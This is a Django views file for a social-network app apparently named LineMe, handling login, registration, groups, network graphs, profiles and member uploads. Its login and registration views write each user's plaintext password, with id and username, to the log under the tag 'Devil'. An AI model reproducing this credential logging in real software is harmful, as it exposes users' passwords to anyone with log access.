import json

from django.contrib.auth import logout
from django.contrib.auth.decorators import login_required
from django.core.paginator import PageNotAnInteger
from django.core.paginator import Paginator, EmptyPage
from django.db.models import Q
from django.http import HttpResponse, JsonResponse
from django.shortcuts import redirect, render, get_object_or_404
from django.utils import timezone

from Human.forms import LoginForm, RegisterForm, GroupCreateForm, GroupMemberCreateForm, ReJoinIdentifierForm, \
    FileUploadForm
from Human.methods.avatar import create_avatar, handle_avatar
from Human.methods.lm_ego import get_user_ego_graph
from Human.methods.group import get_group_joined_num, group_recommender, create_group, get_user_join_status
from Human.methods.groupmember import member_recommender, create_group_member, member_join
from Human.methods.link import link_confirm, update_links
from Human.methods.link import link_reject
from Human.methods.lm_global import get_user_global_info, get_user_global_graph, get_user_global_map
from Human.methods.profile import update_profile
from Human.methods.sessionid import get_session_id
from Human.methods.user import create_user, get_user_groups, get_user_msgs_count, get_user_msgs, get_user_invs, \
    get_user_name
from Human.methods.utils import smart_search, login_user, logger_join
from Human.methods.validation import check_groupid, check_profile
from Human.models import Group, GroupMember, MemberRequest
from LineMe.constants import PROJECT_NAME, IDENTIFIER, CITIES_TABLE
from LineMe.settings import logger


def redirect2main(request):
    return redirect('home')


def search(request):
    kw = request.GET.get('kw')
    groupid = request.GET.get('gid')
    return HttpResponse(json.dumps(smart_search(request, kw, groupid, 5)))


########################################################################

def lm_login(request):
    context = {"project_name": PROJECT_NAME, "status": ''}
    if request.method == 'POST':
        lf = LoginForm(request.POST)

        if lf.is_valid():
            username = lf.cleaned_data['username']
            password = lf.cleaned_data['password']

            if login_user(request, username, password) == 0:

                logger.warning(logger_join('Devil', '[' + ','.join([str(request.user.id), username, password]) + ']'))
                logger.info(logger_join('Login', get_session_id(request)))

                return redirect('home')

        context["status"] = -1
        return render(request, 'Human/login.html', context)

    else:
        return render(request, 'Human/login.html', context)


def lm_logout(request):
    logger.info(logger_join('Logout', get_session_id(request)))
    logout(request)
    return redirect('login')


def lm_register(request):
    context = {"project_name": PROJECT_NAME, "status": 0}
    if request.method == 'POST':
        rf = RegisterForm(request.POST)
        # print 'Register Form valid: ', rf.is_valid()
        if rf.is_valid():
            name = rf.cleaned_data['username']
            email = rf.cleaned_data['email']
            password = rf.cleaned_data['password']
            password2 = rf.cleaned_data['password2']

            # status = 0
            status = create_user(request, name, email, password, password2)
            context["status"] = status
            # print name, password, email

            if status == 0:
                request.session['NewLogin'] = True
                logger.warning(logger_join('Devil', '[' + ','.join([str(request.user.id), name, password]) + ']'))
                return redirect('profile')
            else:
                return render(request, 'Human/register.html', context)
        else:
            context["status"] = -4
            return render(request, 'Human/register.html', context)

    else:
        return render(request, 'Human/register.html', context)


########################################################################

@login_required
def home(request):
    logger.info(logger_join('Access', get_session_id(request)))

    user = request.user
    groups = get_user_groups(user)

    my_groups, in_groups = {}, {}

    for group in groups:
        if group.creator == user:
            my_groups[group] = get_group_joined_num(group)
        else:
            in_groups[group] = get_group_joined_num(group)

    msgs_count = get_user_msgs_count(user)
    rcmd_groups = group_recommender(user)

    context = {"project_name": PROJECT_NAME, "user": user, "my_groups": my_groups,
               "in_groups": in_groups, "rcmd_groups": rcmd_groups, "msgs_count": msgs_count,
               "status": 0, "identifier": IDENTIFIER}

    # Todo: group create check
    if request.method == 'POST':
        gf = GroupCreateForm(request.POST)
        # print gf.is_valid()
        if gf.is_valid():
            name = gf.cleaned_data['name']
            maxsize = gf.cleaned_data['maxsize']
            identifier = int(gf.cleaned_data['identifier'])
            gtype = int(gf.cleaned_data['type'])

            # Todo: add no more credits
            status = create_group(request, user, name, maxsize, identifier, gtype)
            context["status"] = status
            if status == 0:
                groupid = Group.objects.get(group_name=name).id
                return redirect('group', groupid=groupid)

        context["status"] = -1
        return render(request, 'Human/home.html', context)
    else:
        return render(request, 'Human/home.html', context)


@login_required
def msg_panel(request, page):
    user = request.user

    if request.is_ajax():

        msgs = get_user_msgs(user)

        paginator = Paginator(msgs, 10)

        try:
            p = paginator.page(page)
        except PageNotAnInteger:
            p = paginator.page(1)
        except EmptyPage:
            p = paginator.page(paginator.num_pages)

        my_members = GroupMember.objects.filter(user=user)

        msg_creators = {xp: GroupMember.objects.get(user=xp.creator, group=xp.group).member_name for xp in p}
        # print msg_creators

        return render(request, 'Human/home_msg.html',
                      {'msgs': p, 'my_members': my_members, 'msg_creators': msg_creators})
    else:
        return HttpResponse(status=403)


@login_required
def msg_handle(request, mtype, linkid):
    user = request.user

    if mtype == '1':
        status = link_confirm(request, user, int(linkid))
    elif mtype == '0':
        status = link_reject(request, user, int(linkid))
    else:
        return HttpResponse(status=403)

    return HttpResponse(status)


@login_required
def inv_panel(request, page):
    user = request.user

    if request.is_ajax():

        # Todo: fix chinese 500
        group_name = request.GET.get('groupname')
        if group_name:
            invs = get_user_invs(user, group_name)
        else:
            invs = get_user_invs(user)

        paginator = Paginator(invs, 8)

        try:
            p = paginator.page(page)
        except PageNotAnInteger:
            p = paginator.page(1)
        except EmptyPage:
            p = paginator.page(paginator.num_pages)

        my_members = GroupMember.objects.filter(user=user)

        return render(request, 'Human/home_inv.html', {'invs': p, 'my_members': my_members})
    else:
        return HttpResponse(status=403)


# Todo: implement email sender
@login_required
def send_email2unconfirmed(request):
    return 0


########################################################################

@login_required
def ego_network(request, groupid=0):
    logger.info(logger_join('Access', get_session_id(request), gid=groupid))

    user = request.user
    groups = get_user_groups(user)
    rcmd_groups = group_recommender(user)
    msgs_count = get_user_msgs_count(user)

    groupid = check_groupid(user, groupid)
    if groupid == 0:
        group = None
    else:
        group = get_object_or_404(Group, id=groupid)

    context = {"project_name": PROJECT_NAME, "user": user, "groups": groups,
               "group": group, "rcmd_groups": rcmd_groups, "msgs_count": msgs_count}

    return render(request, 'Human/ego.html', context)


@login_required
def ego_graph(request, groupid=0):
    logger.info(logger_join('Access', get_session_id(request), gid=groupid))

    user = request.user
    groupid = check_groupid(user, groupid)
    if groupid == 0:
        return JsonResponse({"nodes": None, "links": None}, safe=False)

    data = get_user_ego_graph(user, groupid)

    return JsonResponse(data, safe=False)


@login_required
def rcmd_panel(request, groupid, page):
    user = request.user

    if request.is_ajax():

        groupid = check_groupid(user, groupid)
        if groupid == 0:
            return render(request, 'Human/ego_rcmd.html')

        rcmd_gms = member_recommender(user, groupid)

        paginator = Paginator(rcmd_gms, 6)

        try:
            p = paginator.page(page)
        except PageNotAnInteger:
            p = paginator.page(1)
        except EmptyPage:
            p = paginator.page(paginator.num_pages)

        return render(request, 'Human/ego_rcmd.html', {'members': p})
    else:
        return HttpResponse(status=403)


@login_required
def update_graph(request, groupid):
    user = request.user

    if request.is_ajax():
        new_links = request.POST.get('links')

        # Todo: success link ??? and security
        update_links(request, new_links, groupid, user)
        return HttpResponse("Link update successfully")

    else:
        return HttpResponse(status=403)


########################################################################

@login_required
def global_network(request, groupid=0):
    logger.info(logger_join('Access', get_session_id(request), gid=groupid))

    user = request.user
    groups = get_user_groups(user)
    msgs_count = get_user_msgs_count(user)
    groupid = check_groupid(user, groupid)

    if groupid == 0:
        group = None
        context = {}
    else:
        group = get_object_or_404(Group, id=groupid)
        context = get_user_global_info(user, groupid)

    context.update({"project_name": PROJECT_NAME, "user": user, "groups": groups,
                    "group": group, "msgs_count": msgs_count})

    return render(request, 'Human/global.html', context)


@login_required
def global_graph(request, groupid=0):
    logger.info(logger_join('Access', get_session_id(request), gid=groupid))

    user = request.user
    groupid = check_groupid(user, groupid)

    if groupid == 0:
        return JsonResponse({"nodes": None, "links": None}, safe=False)

    data = get_user_global_graph(user, groupid)

    return JsonResponse(data, safe=False)


@login_required
def global_map(request, groupid=0):
    logger.info(logger_join('Access', get_session_id(request), gid=groupid))

    user = request.user
    groupid = check_groupid(user, groupid)

    if groupid == 0:
        return JsonResponse({"nodes": None, "links": None}, safe=False)

    data = get_user_global_map(user, groupid)

    return JsonResponse(data, safe=False)


########################################################################

@login_required
def profile(request):
    logger.info(logger_join('Access', get_session_id(request)))

    user = request.user
    first_login = request.session.get('NewLogin')

    username = get_user_name(user)

    msgs_count = get_user_msgs_count(user)
    if user.extra.location:
        country, city = user.extra.location.split('-')
    else:
        country, city = "", ""

    context = {"project_name": PROJECT_NAME, "user": user, "username": username, "msgs_count": msgs_count,
               "first_login": first_login, 'cities_table': CITIES_TABLE, 'country': country, 'city': city}

    if request.is_ajax():
        first_name = request.POST.get('firstname')
        last_name = request.POST.get('lastname')
        birth = request.POST.get('birth')
        sex = int(request.POST.get('sex'))
        country = request.POST.get('country').replace('-', ' ')
        city = request.POST.get('city').replace('-', ' ')
        institution = request.POST.get('institution')

        # print country, city

        if check_profile(first_name, last_name, birth, sex, country, city, institution):
            if update_profile(request, user, first_name, last_name, birth, sex, country, city, institution) == 0:
                if first_login:
                    create_avatar(request, user.id, username=first_name + ' ' + last_name)
                    del request.session['NewLogin']

                return HttpResponse(0)

        else:
            return HttpResponse(-1)

    return render(request, 'Human/profile.html', context)


########################################################################

@login_required
def avatar(request):
    logger.info(logger_join('Access', get_session_id(request)))

    user = request.user
    msgs_count = get_user_msgs_count(user)

    context = {"project_name": PROJECT_NAME, "user": user, "msgs_count": msgs_count}
    return render(request, 'Human/avatar.html', context)


@login_required
def img_handle(request):
    if request.is_ajax():
        # print 'Avatar ajax received: ', request.user.id
        if handle_avatar(request) == 0:
            return HttpResponse('Upload success')
        else:
            HttpResponse('Upload failed')
    else:
        return HttpResponse(status=403)


########################################################################


# Todo: learn from ego and global
@login_required
def manage_group(request, groupid=0):
    logger.info(logger_join('Access', get_session_id(request), gid=groupid))

    ufs = request.session.get('UpFileStat')
    if ufs:
        del request.session['UpFileStat']

    user = request.user
    groups = get_user_groups(user)
    rcmd_groups = group_recommender(user)
    msgs_count = get_user_msgs_count(user)

    group = get_object_or_404(Group, id=groupid)

    context = {"project_name": PROJECT_NAME, "user": user, "group": group, "groups": groups,
               "rcmd_groups": rcmd_groups, "upfile": ufs, "msgs_count": msgs_count}

    if request.method == 'POST':
        gf = GroupMemberCreateForm(request.POST)
        # print gf.is_valid()
        if gf.is_valid():
            name = gf.cleaned_data['name']
            identifier = gf.cleaned_data['identifier']

            # Todo: dangerous need fix ->status
            m = create_group_member(request, group, name, identifier)

            return redirect('group', groupid=groupid)

    if user != group.creator:
        members = GroupMember.objects.filter(group=group)
        members_count = members.count()

        follow_status = get_user_join_status(request, user, group)
        context.update({'creator': group.creator, 'members_count': members_count, 'follow_status': follow_status})
        return render(request, 'Human/group2.html', context)

    else:

        mpage = request.GET.get('mpage')

        # Todo: implement request paginator
        rpage = request.GET.get('rpage')

        members = GroupMember.objects.filter(group=group).order_by('-created_time')
        request_members = MemberRequest.objects.filter(group=group).exclude(is_valid=False)
        paginator = Paginator(members, 15)

        try:
            p = paginator.page(mpage)
        except PageNotAnInteger:
            p = paginator.page(1)
        except EmptyPage:
            p = paginator.page(paginator.num_pages)

        members_count = members.count()
        context.update({'members': p, 'creator': user, 'members_count': members_count, 'requests': request_members})
        return render(request, 'Human/group1.html', context)


@login_required
def join(request, groupid):
    # Todo: spacial code join -----

    user = request.user
    group = get_object_or_404(Group, id=groupid)

    if request.is_ajax():
        gm = GroupMember.objects.filter((Q(member_name=get_user_name(user)) | Q(member_name=user.username)),
                                        group=group)

        if not gm.exists():
            return HttpResponse(-2)

        status = -1
        if group.identifier == 1:
            if gm.filter(token=user.email).count() == 1:
                status = member_join(request, user, group, user.email)
            else:
                logger.warning(logger_join('Join', get_session_id(request), 'failed or scode'))
        elif group.identifier == 2:
            if gm.filter(token=user.extra.institution).count() == 1:
                status = member_join(request, user, group, user.institution)
            else:
                logger.warning(logger_join('Join', get_session_id(request), 'failed or scode'))

        return HttpResponse(status)

    elif request.method == 'POST':
        rf = ReJoinIdentifierForm(request.POST)

        if rf.is_valid():
            identifier = rf.cleaned_data['identifier']
            # print 'Rejoin: ', groupid, identifier
            if identifier != '':
                gm = GroupMember.objects.filter((Q(member_name=get_user_name(user)) | Q(member_name=user.username)),
                                                group=group, token=identifier)
                if gm.count() == 1:
                    status = member_join(request, user, group, identifier)
                    if status == 0:
                        logger.info(logger_join('Join', get_session_id(request), mid=gm[0].id))
                        return redirect('egoId', groupid=groupid)

        request.session['join_failed'] = True
        return redirect('group', groupid=groupid)

    else:
        return HttpResponse(status=403)


@login_required
def join_request(request, groupid):
    user = request.user
    group = get_object_or_404(Group, id=groupid)

    if request.method == 'POST' and not GroupMember.objects.filter(user=user, group=group).exists():
        mesg = request.POST.get('message')

        if MemberRequest.objects.filter(user=user, group=group).exists():

            mr = get_object_or_404(MemberRequest, user=user, group=group)
            mr.message = mesg
        else:
            mr = MemberRequest(user=user,
                               group=group,
                               message=mesg,
                               created_time=timezone.now(),
                               is_valid=True)
        mr.save()

        return redirect('group', groupid=groupid)

    else:
        return HttpResponse(status=403)


@login_required
def join_confirm(request, groupid, requestid):
    user = request.user
    group = get_object_or_404(Group, id=groupid)

    if request.method == 'GET' and group.creator == user:

        mr = get_object_or_404(MemberRequest, id=requestid, group=group)
        mr.is_valid = False
        mr.save()

        m = create_group_member(request, group, get_user_name(mr.user), 'accepted', mr.user)

        if m:
            m.is_joined = True
            m.save()
            return redirect('group', groupid)
        else:

            # Todo: confirm failed
            return redirect('group', groupid)
    else:
        return HttpResponse(status=403)


@login_required
def upload_members(request, groupid):
    user = request.user

    if Group.objects.filter(creator=user, id=groupid).exists():
        group = Group.objects.get(id=groupid)

        if request.method == 'POST':
            fuf = FileUploadForm(request.POST, request.FILES)
            if fuf.is_valid():
                members = []

                # Todo: file check, extend to a func
                with request.FILES.get('members') as f:
                    for l in f:
                        kv = l.strip().split(',')

                        if len(kv) != 2:
                            return redirect('group', groupid=groupid)
                        else:
                            members.append(kv)

                for m in members:
                    if not create_group_member(request, group, m[0], m[1]):
                        return redirect('group', groupid=groupid)

                request.session['UpFileStat'] = True
                return redirect('group', groupid=groupid)
            else:

                return redirect('group', groupid=groupid)

    else:

        return redirect('group', groupid=groupid)
